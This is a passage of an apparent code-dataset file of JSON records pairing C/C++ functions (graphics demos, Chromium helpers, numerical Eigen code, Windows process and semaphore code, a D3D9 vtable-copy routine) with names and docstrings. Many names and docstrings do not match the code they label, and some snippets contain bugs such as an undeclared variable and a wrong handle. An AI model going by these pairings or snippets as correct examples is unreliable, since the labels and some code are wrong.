Matrix::Multiply\\r\\n        (\\r\\n            (*matrix),\\r\\n            (*LuaState::GetFuncParam<Matrix>(state, 2)),\\r\\n            (*LuaState::GetFuncParam<Matrix>(state, 3))\\r\\n        );\\r\\n    }\\r\\n    else\\r\\n    {\\r\\n        \/\/ Return correct parameter error.\\r\\n        \/\/ First param can be a number of Matrix but not a Vector.\\r\\n        if(!lua_isnumber(state, 2) || !LuaState::IsType(state, 2, Matrix::Meta.Name().c_str()))\\r\\n        {\\r\\n            return luaL_typerror(state, 2, \"number or Matrix\");\\r\\n        }\\r\\n        else\\r\\n        {\\r\\n            return luaL_typerror(state, 3, \"number or Matrix\");\\r\\n        }\\r\\n    }\\r\\n    return 0;\\r\\n}'}","id":1433}
{"content":"{'function_name': 'moonMotion', 'docstring': '\/* positions of moon around the earth *\/', 'code': 'int main() {\\n\\t\/* request auto detection *\/\\n\\tint gdriver = DETECT, gmode, err;\\n\\tint midx, midy, earth, orbit, moon;\\n\\tint i = 0, x[60], y[60];\\n\\n\\t\/* initialize graphic mode *\/\\n\\tinitgraph(&gdriver, &gmode, \"C:\/\/TURBOC3\/\/BGI\");\\n\\terr = graphresult();\\n\\n\\tif (err != grOk) {\\n\\t\\t\/* error occurred *\/\\n\\t\\tprintf(\"Graphics Error: %s\",\\n\\t\\t\\t\\tgrapherrormsg(err));\\n\\t\\treturn 0;\\n\\t}\\n\\n\\tearth = 50, orbit = 100, moon = 25, moon1 = 25;\\n\\n\\t\/* mid position in x and y-axis *\/\\n\\tmidx = getmaxx() \/ 2;\\n\\tmidy = getmaxy() \/ 2;\\n\\n\\t\/* get the positions of moon around earth for rotation *\/\\n\\tmoonMotion(orbit, midx, midy, x, y);\\n\\n\\n\\twhile(!kbhit()) {\\n\\t\\t\/* drawing earth at the center *\/\\n\\t\\tsetcolor(BLUE);\\n\\t\\tsetfillstyle(SOLID_FILL, BLUE );\\n\\t\\tpieslice(midx, midy, 0, 360, earth);\\n\\n\\t\\t\/* drawing virtual orbit around the earth *\/\\n\\t\\tsetcolor(WHITE);\\n\\t\\tsetlinestyle(DASHED_LINE, 1, 1);\\n\\t\\tcircle(midx, midy, orbit);\\n\\n\\t\\t \/\/delay(500);\\n\/* rotate moon around the earth *\/\\n\\tsetcolor(RED);\\n\\t\\tsetfillstyle(SOLID_FILL,RED);\\n\\t\\tsetlinestyle(SOLID_LINE, 1, 1);\\n\\t\\tpieslice(x[i], y[i], 0, 360, moon);\\n\\n\\t\\t\/* sleep for 200 milliseconds *\/\\n\\t     delay(200);\\n\\n\\n\\t\\t\\tsetcolor(YELLOW);\\n\\t\\tsetfillstyle(SOLID_FILL, YELLOW);\\n\\t\\tsetlinestyle(SOLID_LINE, 1, 1);\\n\\t\\tpieslice(x[i], y[i], 0, 360, moon);\\n\\n\\n\\n\\n\\n\\t\\t\\tsetcolor(WHITE);\\n\\t\\tsetlinestyle(DASHED_LINE, 1, 1);\\n\\t\\tcircle(midx, midy, orbit+70);\\n\\n\\t\\tdelay(200);\\n\\n\\t\\t\/* clears the graphic screen *\/\\n\\t\\t\\tcleardevice();\\n\\n\\t\\t\/* checks for one complete rotation *\/\\n\\t\\ti = (i + 1) % 60;\\n\\n\\n}\\n\\n\\tclosegraph();\\n\\n\\treturn 0;\\n  }'}","id":1441}
{"content":"{'function_name': 'FindSlicesForRemainingContent', 'docstring': '\/\/ slice is always half open, which sends range request like \"Range:50-\".', 'code': 'bool IsParallelDownloadEnabled() {\\n  bool feature_enabled =\\n      base::FeatureList::IsEnabled(features::kParallelDownloading);\\n  \/\/ Disabled when |kEnableParallelDownloadFinchKey| Finch config is set to\\n  \/\/ false.\\n  bool enabled_parameter = GetFieldTrialParamByFeatureAsBool(\\n      features::kParallelDownloading, kEnableParallelDownloadFinchKey, true);\\n  return feature_enabled && enabled_parameter;\\n}'}","id":1442}
{"content":"{'function_name': 'normalPoint', 'docstring': '\/\/Normal point of (pt) on the line (p + t e)', 'code': 'Vector3 projection(const Vector3& e, const VectorXd& r)\\n{\\n  \/\/Projection of the vector (e) onto (r(0) x + r(1) y + r(2) z + r(3) = 0)\\n\\n  Vector3 n( r(0), r(1), r(2) );\\n  n=n\/abs(n);\\n\\n  Vector3 v = Vector3(e\/abs(e));\\n\\n  double s = dot(n, v);\\n  double t = sqrt(1 - s*s);\\n\\n  return Vector3( (v-s*n)\/t );\\n}'}","id":1443}
{"content":"{'function_name': 'r_i_calculator_Bernstein', 'docstring': '\/\/std::cout<<\"Emin_global: \"<<\\'\\\\n\\'<<Emin_global<<std::endl;', 'code': 'VECTOR alfaf_ij_creator_SPARSE( const VECTOR& lumped_mass , const MATRIX& mass , const VECTOR& delta_phi , const VECTOR& phi_L , T dt , const MATRIX& D_ij , const MATRIX& Dc_ij , const VECTOR& phi_old , const POSITION& S_i)\\n{\\n    \\n    MATRIX new_mass = - mass;\\n    for(size_t i = 0 ; i < new_mass.rows() ; i++){\\n        new_mass.coeffRef(i,i) += lumped_mass(i);\\n    }\\n    \\n    MATRIX new_D = (Dc_ij - D_ij); \/\/(D_ij - Dc_ij);\\n    \\n    SparseMatrix<T> f_ij =  SparseMatrix<T>( mass.rows() , mass.cols() );\\n    std::vector< Triplet<T> >   triplets0;\\n    SparseMatrix<T> alpha_ij =  SparseMatrix<T>( mass.rows() , mass.cols() );\\n    std::vector< Triplet<T> >   triplets1;\\n    \\n    \\n    \/\/MATRIX f_ij = Eigen::Matrix<T, Dynamic, Dynamic>::Zero( mass.rows(), mass.cols() );\\n    \/\/MATRIX alpha_ij = Eigen::Matrix<T, Dynamic, Dynamic>::Zero( mass.rows(), mass.cols() );\\n    \\n    VECTOR ret = Eigen::Matrix<T, Dynamic, 1>::Zero( mass.rows(), 1 );\\n    \\n    VECTOR P_plus = Eigen::Matrix<T, Dynamic, 1>::Zero(mass.rows(), 1);\\n    VECTOR P_minus = Eigen::Matrix<T, Dynamic, 1>::Zero(mass.rows(), 1);\\n    VECTOR Q_plus = Eigen::Matrix<T, Dynamic, 1>::Zero(mass.rows(), 1);\\n    VECTOR Q_minus = Eigen::Matrix<T, Dynamic, 1>::Zero(mass.rows(), 1);\\n    \\n    VECTOR R_plus = Eigen::Matrix<T, Dynamic, 1>::Ones(mass.rows(), 1);\\n    VECTOR R_minus = Eigen::Matrix<T, Dynamic, 1>::Ones(mass.rows(), 1);\\n    VECTOR phi_max = phi_old;\\n    VECTOR phi_min = phi_old;\\n    \\n               \\n    size_t counter = 0;\\n    for(auto& row_i:S_i)\\n    {\\n        for(auto& elem:row_i)\\n        {\\n            phi_max(counter) = std::max(phi_old(elem),phi_max(counter));\\n            phi_min(counter) = std::min(phi_old(elem),phi_min(counter));\\n        }\\n        counter++;\\n    }\\n    \\n    counter = 0;\\n    for(auto& row_i:S_i)\\n    {\\n        for(auto& elem:row_i)\\n        {\\n            auto value = new_mass.coeff(counter,elem)*(delta_phi(elem)-delta_phi(counter)) + dt*new_D.coeff(counter,elem)*(phi_old(elem)-phi_old(counter)) ;\\n            \\n            triplets0.push_back( Triplet<T>(counter, elem , value ));\\n            P_plus(counter) += std::max( 0. , value );\\n            P_minus(counter) += std::min( 0. , value );\\n                                \\n        }\\n        \\n        Q_plus(counter) = lumped_mass(counter)*(phi_max(counter)-phi_L(counter));\\n        Q_minus(counter) = lumped_mass(counter)*(phi_min(counter)-phi_L(counter));\\n        if( std::abs(P_plus(counter)) > 1e-20 ){\\n            T Q_P_plus = Q_plus(counter)\/P_plus(counter);\\n            R_plus(counter) = std::min( 1.0 , Q_P_plus );\\n        }\\n        if( std::abs(P_minus(counter)) > 1e-20 ){\\n            T Q_P_minus = Q_minus(counter)\/P_minus(counter);\\n            R_minus(counter) = std::min( 1.0 , Q_P_minus );\\n        }\\n        \\n        \\n        counter++;\\n    }\\n    \\n\\n    f_ij.setFromTriplets( triplets0.begin(), triplets0.end() );\\n    triplets0.clear();\\n    \\n    size_t i = 0 ;\\n    for(auto& row_i:S_i)\\n    {\\n        for(auto& j:row_i)\\n        {\\n            if( f_ij.coeff(i, j) > 0 ){\\n                auto value = std::min( R_plus(i) , R_minus(j) );\\n                triplets1.push_back( Triplet<T>(i, j , value ));\\n                \\n            }\\n            else{\\n                auto value = std::min( R_plus(j) , R_minus(i) );\\n                triplets1.push_back( Triplet<T>(i, j , value ));\\n                \\n            }\\n        }\\n        i++;\\n    }\\n    \\n    alpha_ij.setFromTriplets( triplets1.begin(), triplets1.end() );\\n    triplets1.clear();\\n    \\n    \\n    size_t counter2 = 0;\\n    for(auto& row_i:S_i)\\n    {\\n        for(auto& elem:row_i)\\n        {\\n            ret(counter2) += ( alpha_ij.coeff(counter2,elem)*f_ij.coeff(counter2,elem) );\\n        }\\n        counter2++;\\n    }\\n\\n    \\n    \/\/ CHECKING F and Alpha properties\\n    \\n    \/*\\n    std::cout<<\"f_ij checking symmetry\"<<\\'\\\\n\\'<<std::endl;\\n    for(size_t i = 0; i< f_ij.rows() ; i++)\\n    {\\n        for(size_t j = 0; j< f_ij.cols() ; j++)\\n        {\\n            std::cout<<f_ij.coeff(i,j)+f_ij.coeff(j,i)<<\" , \";\\n        }\\n       std::cout<<\\'\\\\n\\'<<std::endl;\\n    }\\n    \\n    \\n    \\n    std::cout<<\"alpha_ij checking symmetry\"<<\\'\\\\n\\'<<std::endl;\\n    for(size_t i = 0; i< f_ij.rows() ; i++)\\n    {\\n        for(size_t j = 0; j< f_ij.cols() ; j++)\\n        {\\n            std::cout<<alpha_ij.coeff(i,j)-alpha_ij.coeff(j,i)<<\" , \";\\n        }\\n       std::cout<<\\'\\\\n\\'<<std::endl;\\n    }\\n    *\/\\n    \\n    \\n    \\n    \/*\\n    std::cout<<\"f_ij checking symmetry\"<<\\'\\\\n\\'<<std::endl;\\n    size_t counter3 = 0;\\n    \\n    for(auto& row_i:S_i)\\n    {\\n        for(auto& elem:row_i)\\n        {\\n            std::cout<<f_ij.coeff(counter3,elem)+f_ij.coeff(elem,counter3)<<\" , \";\\n        }\\n        counter3++;\\n        std::cout<<\\'\\\\n\\';\\n    }\\n    std::cout<<std::endl;\\n     \\n    counter3 = 0;\\n     std::cout<<\"alpha_ij checking symmetry: METODO 2\"<<\\'\\\\n\\'<<std::endl;\\n    for(auto& row_i:S_i)\\n    {\\n        for(auto& elem:row_i)\\n        {\\n            std::cout<<alpha_ij.coeff(counter3,elem)-alpha_ij.coeff(elem,counter3)<<\" , \";\\n        }\\n        counter3++;\\n        std::cout<<\\'\\\\n\\';\\n    }\\n    std::cout<<std::endl;\\n    \\n    \/\/  CHECKING F_IJ\\n    \\n    VECTOR ret0 = Eigen::Matrix<T, Dynamic, 1>::Zero(new_mass.rows(), 1);\\n    VECTOR ret1 = Eigen::Matrix<T, Dynamic, 1>::Zero(new_mass.rows(), 1);\\n    size_t counter4 = 0;\\n    for(auto& row_i:S_i)\\n    {\\n        for(auto& elem:row_i)\\n        {\\n            ret0(counter4) += new_mass.coeff(counter4,elem)*(delta_phi(elem)-delta_phi(counter4));\\n            ret1(counter4) += new_D.coeff(counter4,elem)*(phi_old(elem)-phi_old(counter4));\\n        }\\n        counter++;\\n    }\\n    \\n    VECTOR f_i = (ret0 + dt*ret1);\\n    \\n    VECTOR f_i_NEW = Eigen::Matrix<T, Dynamic, 1>::Zero(new_mass.rows(), 1);\\n    VECTOR One_Vec = Eigen::Matrix<T, Dynamic, 1>::Ones(new_mass.rows(), 1);\\n    \/\/sum_Si( S_i , f_ij , One_Vec , f_i_NEW );\\n    size_t counter5 = 0;\\n    for(auto& row_i:S_i)\\n    {\\n        for(auto& elem:row_i)\\n        {\\n            f_i_NEW(counter5) += f_ij.coeff(counter5,elem)*(One_Vec(elem));\\n        }\\n        counter5++;\\n    }\\n    \\n    std::cout<<\\'\\\\n\\'<<\"Diff f_i 2 meths is:\"<<\\'\\\\n\\'<< f_i_NEW - f_i<<std::endl;\\n    *\/\\n    return  ret ;\\n    \\n}'}","id":1446}
{"content":"{'function_name': 'embed', 'docstring': '\/\/ \u043f\u043e\u0433\u0440\u0443\u0436\u0435\u043d\u0438\u0435 \u0432\u0435\u043a\u0442\u043e\u0440\u0430', 'code': 'vec<len,number_t> proj(const vec<Dim,number_t> &v) { \/\/\u043f\u0440\u043e\u0435\u043a\u0446\u0438\u044f \u0432\u0435\u043a\u0442\u043e\u0440\u0430\\n    vec<len,number_t> ret;\\n    for (size_t i=len; i--; ret[i]=v[i]);\\n    return ret;\\n}'}","id":1448}
{"content":"{'function_name': 'num_adress', 'docstring': '\/\/ \u0410\u0434\u0440\u0435\u0441 \u0434\u043b\u044f \u043e\u043f\u0440\u043e\u0441\u0430\\r', 'code': 'DWORD WINAPI ThreadFunc(PVOID pvParam)\\r\\n{\\r\\n\\t\\tDWORD dwWaitResult;\\r\\n\\t\\tBOOL bContinue = TRUE;\\r\\n\\t\\t\/\/\u041d\u043e\u043c\u0435\u0440 \u043f\u043e\u0442\u043e\u043a\u0430\\r\\n\\t\\tint i = (*((int*)pvParam));\\r\\n\\t\\t\/\/\u041f\u0443\u0442\u044c exe \u0444\u0430\u0439\u043b\u0430 \u043f\u0435\u0440\u0432\u043e\u0439 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b\\r\\n\\t\\tstring appName = \"E:\\\\\\\\\u0441\u0442\u0430\u0440\u044b\u0439 \u0434\u0438\u0441\u043a\\\\\\\\\u0423\u043d\u0438\u0432\u0435\u0440\\\\\\\\4 \u043a\u0443\u0440\u0441 2 \u0441\u0435\u043c\u0430\u043a\\\\\\\\\u0421\u041f\\\\\\\\\u043b\u0430\u0431\u0430 4\\\\\\\\\u041d\u043e\u0432\u0430\u044f \u043f\u0430\u043f\u043a\u0430\\\\\\\\Process1\\\\\\\\Debug\\\\\\\\Process1.exe\";\\r\\n\\t\\twhile (bContinue)\\r\\n\\t\\t{\\r\\n\\t\\t\\t\\t\/\/\u041e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u043c \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0441\u0435\u043c\u0430\u0444\u043e\u0440\u0430\\r\\n\\t\\t\\t\\tdwWaitResult = WaitForSingleObject(hSemaphore, 0L);           \\r\\n\\t\\t\\t\\tswitch (dwWaitResult) \\r\\n\\t\\t\\t\\t{\\r\\n\\t\\t\\t\\t\\t\/\/\u0421\u0435\u043c\u0430\u0444\u043e\u0440 \u0441\u0432\u043e\u0431\u043e\u0434\u0435\u043d\\r\\n\\t\\t\\t\\t\\tcase WAIT_OBJECT_0:\\r\\n\\t\\t\\t\\t\\tcout << endl;\\r\\n\\t\\t\\t\\t\\tcout << \"\u041f\u043e\u0442\u043e\u043a \"<< GetCurrentThreadId() <<\": \u0437\u0430\u043f\u0443\u0449\u0435\u043d\" << endl;\\r\\n\\t\\t\\t\\t\\tbContinue = FALSE;\\r\\n\\t\\t\\t\\t\\tSleep(5);\\r\\n\\t\\t\\t\\t\\tcout << \"\u041f\u043e\u0440\u044f\u0434\u043a\u043e\u0432\u044b\u0439 \u043d\u043e\u043c\u0435\u0440 \u043f\u043e\u0442\u043e\u043a\u0430: \";\\r\\n\\t\\t\\t\\t\\tcout << (*((int*)pvParam))+1 << endl;\\r\\n\\t\\t\\t\\t\\tSTARTUPINFOA si;\\r\\n\\t\\t\\t\\t\\tPROCESS_INFORMATION piCom;\\r\\n\\t\\t\\t\\t\\tZeroMemory(&si, sizeof(si));\\r\\n\\t\\t\\t\\t\\tsi.cb = sizeof(si);\\r\\n\\t\\t\\t\\t\\t\/\/\u0421\u043e\u0437\u0434\u0430\u0435\u043c \u043d\u043e\u0432\u044b\u0439 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\\r\\n\\t\\t\\t\\t\\tCreateProcessA(appName.c_str(), (char*)cLine.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &piCom);\\r\\n\\t\\t\\t\\t\\t\/\/\u041e\u0436\u0438\u0434\u0430\u0435\u043c \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0438\u044f \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u0430\\r\\n\\t\\t\\t\\t\\tWaitForSingleObject(CreateProcessA, INFINITE);\\r\\n\\t\\t\\t\\t\\tSleep(20000);\\r\\n\\t\\t\\t\\t\\t\/\/\u0417\u0430\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u0432\u0441\u0435 \u043f\u043e\u0442\u043e\u043a\u0438 \u0438 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\\r\\n\\t\\t\\t\\t\\tCloseHandle(piCom.hThread);\\r\\n\\t\\t\\t\\t\\tCloseHandle(piCom.hProcess);\\r\\n\\t\\t\\t\\t\\t\/\/\u041e\u0441\u0432\u043e\u0431\u043e\u0436\u0434\u0430\u0435\u043c \u0441\u0435\u043c\u0430\u0444\u043e\u0440, \u043a\u043e\u0433\u0434\u0430 \u0437\u0430\u043a\u043e\u043d\u0447\u0438\u043b \u0440\u0430\u0431\u043e\u0442\u0443 \u043f\u0440\u043e\u0446\u0435\u0441\u0441. \u0415\u0441\u043b\u0438 \u043e\u0441\u0432\u043e\u0431\u043e\u0434\u0438\u0442\u044c \u043d\u0435 \u043f\u043e\u043b\u0443\u0447\u0438\u043b\u043e\u0441\u044c, \u0432\u044b\u0432\u0435\u0441\u0442\u0438 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u043e\u0431 \u043e\u0448\u0438\u0431\u043a\u0435\\r\\n\\t\\t\\t\\t\\tif (!ReleaseSemaphore(hSemaphore, 1, NULL))       \\r\\n\\t\\t\\t\\t\\t{\\r\\n\\t\\t\\t\\t\\t\\tcout<<\"\u041e\u0448\u0438\u0431\u043a\u0430 \u0440\u0430\u0431\u043e\u0442\u044b \u0441 \u0441\u0435\u043c\u0430\u0444\u043e\u0440\u043e\u043c: \" << GetLastError()<<endl;\\r\\n\\t\\t\\t\\t\\t}\\r\\n\\t\\t\\t\\t\\tbreak;\\r\\n\\t\\t\\t\\t\\t\/\/\u0421\u0435\u043c\u0430\u0444\u043e\u0440 \u0437\u0430\u043d\u044f\u0442, \u043f\u043e\u0442\u043e\u043a \u0436\u0434\u0435\u0442\\r\\n\\t\\t\\t\\t\\tcase WAIT_TIMEOUT:\\r\\n\\t\\t\\t\\t\\tcout << \"\u041f\u043e\u0442\u043e\u043a \" << GetCurrentThreadId() << \": \u0436\u0434\u0435\u0442!\" << endl;\\r\\n\\t\\t\\t\\t\\tbreak;\\r\\n\\t\\t\\t}\\r\\n\\t\\t}\\r\\n\\treturn TRUE;\\r\\n}'}","id":1450}
{"content":"{'function_name': 'RecordInstanceCrashUma', 'docstring': '\/\/ Log the metric to facilitate finding feedback reports in Xamine.', 'code': \"absl::optional<ArcContainerLifetimeEvent> GetArcContainerLifetimeEvent(\\n    size_t restart_after_crash_count,\\n    ArcStopReason stop_reason,\\n    bool was_running) {\\n  \/\/ Record UMA only when this is the first non-early crash. This has to be\\n  \/\/ done before checking other conditions. Otherwise, an early crash after\\n  \/\/ container restart might be recorded. Each CONTAINER_STARTED event can\\n  \/\/ be paired up to one non-START event.\\n  if (restart_after_crash_count)\\n    return absl::nullopt;\\n\\n  switch (stop_reason) {\\n    case ArcStopReason::SHUTDOWN:\\n    case ArcStopReason::LOW_DISK_SPACE:\\n      \/\/ We don't record these events.\\n      return absl::nullopt;\\n    case ArcStopReason::GENERIC_BOOT_FAILURE:\\n      return ArcContainerLifetimeEvent::CONTAINER_FAILED_TO_START;\\n    case ArcStopReason::CRASH:\\n      return was_running ? ArcContainerLifetimeEvent::CONTAINER_CRASHED\\n                         : ArcContainerLifetimeEvent::CONTAINER_CRASHED_EARLY;\\n  }\\n\\n  NOTREACHED();\\n  return absl::nullopt;\\n}\"}","id":1455}
{"content":"{'function_name': 'CCalcGrasppointsClient', 'docstring': '\/\/services for setting parameters', 'code': 'tf::Quaternion quaternionFromVector(tf::Vector3 v2) \\n{\\n  \/\/ all the normalizations are important! except the alst one (with this method!)\\n  tf::Vector3 v1 (1,0,0); \/\/ this to make it works with ros\\n  v2.normalize();\\n\\n  tf::Vector3 cross_vector = v1.cross(v2);\\n  cross_vector.normalize();\\n  \\n  double angle = acos(v1.dot(v2))\/2;\\n  \/\/check for nans values\\n  \/\/ this occures only when v2 has the same direction of v1 (v2.normalize()=v1.normalize())\\n  if(cross_vector.x() != cross_vector.x()) \/\/this will be true only for nans value\\n  {\\n    cross_vector.setX(0);\\n    cross_vector.setY(0);\\n    cross_vector.setZ(0);\\n    \/\/ check if the sense of v2 is positive or negative\\n    if(v2.x()<0)\\n    { \/\/ this means that the sense has to eb negative,\\n      \/\/ and it is equal to a rotation in the y axis of M_PI\\n      angle = angle + M_PI;\\n      cross_vector.setY(1);\\n    } \\n  }\\n  \/\/ Build quaternion\\n  tf::Quaternion quatern; \\n  quatern.setX(cross_vector.x() * sin(angle));\\n  quatern.setY(cross_vector.y() * sin(angle));\\n  quatern.setZ(cross_vector.z() * sin(angle));\\n  quatern.setW(cos(angle));  \\n  quatern.normalize(); \\n\\n  return quatern;\\n}'}","id":1457}
{"content":"{'function_name': 'eval_parity', 'docstring': '\/*\\n    * \u0412\u044b\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u0435 \u0447\u0435\u0442\u043d\u043e\u0441\u0442\u0438 \u043a\u043e\u043c\u0430\u043d\u0434\u044b\\n    * \u041e\u041f\u0418\u0421\u0410\u041d\u0418\u0415\\n    *   \u0412\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u0442 \u0431\u0438\u0442 \u0447\u0435\u0442\u043d\u043e\u0441\u0442\u0438 \u0434\u043b\u044f \u043a\u043e\u043c\u0430\u043d\u0434\u044b \u043f\u043e \u0431\u0438\u0442\u0430\u043c 22-0 \u0434\u043b\u044f \u043a\u043e\u043d\u0442\u0440\u043e\u043b\u044f \u0447\u0435\u0442\u043d\u043e\u0441\u0442\u0438 \\n    * \u041f\u0410\u0420\u0410\u041c\u0415\u0422\u0420\u042b\\n    *   cmd - \u043a\u043e\u043c\u0430\u043d\u0434\u0430;\\n    * \u0412\u041e\u0417\u0412\u0420\u0410\u0429\u0410\u0415\u041c\u041e\u0415 \u0417\u041d\u0410\u0427\u0415\u041d\u0418\u0415\\n    *   \u0447\u0435\u0442\u043d\u043e\u0441\u0442\u044c (0 \u0438\u043b\u0438 1)\\n    *\/', 'code': 'static DWORD fill_command\\n    (\\n    WORD cmd,\\n    WORD param\\n    )\\n     \/*\\n     * \u0417\u0430\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 4-\u0445 \u0431\u0430\u0439\u0442\u043e\u0432\u043e\u0433\u043e \u0441\u043b\u043e\u0432\u0430 \u043a\u043e\u043c\u0430\u043d\u0434\u044b \u0432 \u0441\u043e\u043e\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u0438\u0438 \u0441 \u0444\u043e\u0440\u043c\u0430\u0442\u043e\u043c \u043a\u043e\u043c\u0430\u043d\u0434\u044b \u043f\u043e \u043a\u043e\u0434\u0443 \u043a\u043e\u043c\u0430\u043d\u0434\u044b \u0438 \u0435\u0435 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u0430\u043c\\n     * \u041f\u0410\u0420\u0410\u041c\u0415\u0422\u0420\u042b\\n     *   cmd - \u043a\u043e\u0434 \u043a\u043e\u043c\u0430\u043d\u0434\u044b;\\n     *   param - 2-\u0445 \u0431\u0430\u0439\u0442\u043e\u0432\u044b\u0439 \u043f\u0430\u0440\u043c\u0435\u0442\u0440 \u043a\u043e\u043c\u0430\u043d\u0434\u044b\\n     * \u0412\u041e\u0417\u0412\u0420\u0410\u0429\u0410\u0415\u041c\u041e\u0415 \u0417\u041d\u0410\u0427\u0415\u041d\u0418\u0415\\n     *   32-\u0440\u0430\u0437\u0440. \u0441\u043b\u043e\u0432\u043e \u043f\u043e\u0441\u044b\u043b\u0430\u0435\u043c\u043e\u0439 \u043a\u043e\u043c\u0430\u043d\u0434\u044b\\n     *\/\\n\\n    {\\n    DWORD ret_cmd;\\n    ret_cmd = 0x80C0U | (DWORD)param << 16 | (DWORD)cmd & 0x1F;\\n    ret_cmd |= eval_parity(ret_cmd) << 5;  \/\/\u043f\u043e\u0434\u0441\u0447\u0435\u0442 \u0447\u0435\u0442\u043d\u043e\u0441\u0442\u0438 \u043a\u043e\u043c\u0430\u043d\u0434\u044b (\u0431\u0438\u0442 P)\\n\\n    return ret_cmd;\\n    }'}","id":1458}
{"content":"{'function_name': 'register_initializer_function', 'docstring': '\/\/  printf(\"%s:%d In register_initializer_function --> %p\\\\n\", __FILE__, __LINE__, fptr);', 'code': 'size_t initializer_functions_are_waiting()\\n{\\n\/\/  printf(\"%s:%d initializer_functions_are_waiting returning %\" PRu \"\\\\n\", __FILE__, __LINE__, global_initializer_count );\\n  return global_initializer_count;\\n}'}","id":1459}
{"content":"{'function_name': 'EnumWindowsCallback', 'docstring': '\/\/ window found abort search', 'code': 'bool GetD3D9Device(void** pTable, size_t Size)\\n{\\n\\tif (!pTable)\\n\\t\\treturn false;\\n\\n\\tIDirect3D9* pD3D = Direct3DCreate9(D3D_SDK_VERSION);\\n\\n\\tif (!pD3D)\\n\\t\\treturn false;\\n\\n\\tIDirect3DDevice9* pDummyDevice = NULL;\\n\\n\\t\/\/ options to create dummy device\\n\\tD3DPRESENT_PARAMETERS d3dpp = {};\\n\\td3dpp.Windowed = false;\\n\\td3dpp.SwapEffect = D3DSWAPEFFECT_DISCARD;\\n\\td3dpp.hDeviceWindow = GetProcessWindow();\\n\\n\\tHRESULT dummyDeviceCreated = pD3D->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, d3dpp.hDeviceWindow, D3DCREATE_SOFTWARE_VERTEXPROCESSING, &d3dpp, &pDummyDevice);\\n\\n\\tif (dummyDeviceCreated != S_OK)\\n\\t{\\n\\t\\t\/\/ may fail in windowed fullscreen mode, trying again with windowed mode\\n\\t\\td3dpp.Windowed = !d3dpp.Windowed;\\n\\n\\t\\tdummyDeviceCreated = pD3D->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, d3dpp.hDeviceWindow, D3DCREATE_SOFTWARE_VERTEXPROCESSING, &d3dpp, &pDummyDevice);\\n\\n\\t\\tif (dummyDeviceCreated != S_OK)\\n\\t\\t{\\n\\t\\t\\tpD3D->Release();\\n\\t\\t\\treturn false;\\n\\t\\t}\\n\\t}\\n\\n\\tmemcpy(pTable, *reinterpret_cast<void***>(pDummyDevice), Size);\\n\\n\\tpDummyDevice->Release();\\n\\tpD3D->Release();\\n\\treturn true;\\n}'}","id":1460}
{"content":"{'function_name': 'is_comment', 'docstring': '\/\/ first non-null character is #', 'code': 'inline bool is_comment(string line, string prefix)\\n{\\n  unsigned int i = 0;\\n  while (i < (line.length()) && (is_space(line[i])))\\n    i++;\\n  if (i == line.length())\\n    return (true); \/\/ consider empty line as a comment\\n  if (i + prefix.length() > line.length())\\n    return (false);\\n  return (!line.compare(i, prefix.length(), prefix));\\n}'}","id":1464}
{"content":"{'function_name': 'denoiseb_rd19_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd2_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd2 read pattern: { denoiseb_update_0[d0, d1] -> raw[-2 + 2d0, d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 1932 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write0 = raw.raw_raw_update_0_write0_merged_banks_25.peek_1932();\\n  return value_raw_raw_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":1470}
{"content":"{'function_name': 'solveKT', 'docstring': '\/\/ printSolution(sol);\\r', 'code': 'int solveKTUtil(int x, int y, int movei,\\r\\n                int xMove[4], int yMove[4],int n)\\r\\n{\\r\\n   int k, next_x, next_y;\\r\\n   if (movei == total)\\r\\n       return true;\\r\\n\\r\\n   \/* Try all next moves from the current coordinate x, y *\/\\r\\n   for (k = 0; k < 4; k++)\\r\\n   {\\r\\n       next_x = x + xMove[k];\\r\\n       next_y = y + yMove[k];\\r\\n       if (isSafe(next_x, next_y,n))\\r\\n       {\\r\\n         sol[next_x][next_y] = movei;\\r\\n         if (solveKTUtil(next_x, next_y, movei+1,\\r\\n                         xMove, yMove,n) == true)\\r\\n             return true;\\r\\n         else\\r\\n             sol[next_x][next_y] = -1;\/\/ backtracking\\r\\n       }\\r\\n   }\\r\\n\\r\\n   return false;\\r\\n}'}","id":1472}
{"content":"{'function_name': 'p_GeoDaWeight__GetMinNeighbors', 'docstring': '\/\/ invoke the function', 'code': 'int p_GeoDaWeight__GetMaxNeighbors(SEXP xp)\\n{\\n  \/\/ grab the object as a XPtr (smart pointer) to GeoDaWeight\\n  Rcpp::XPtr<GeoDaWeight> ptr(xp);\\n\\n  \/\/ invoke the function\\n  int max_nbrs = ptr->GetMaxNbrs();\\n\\n  return max_nbrs;\\n}'}","id":1477}
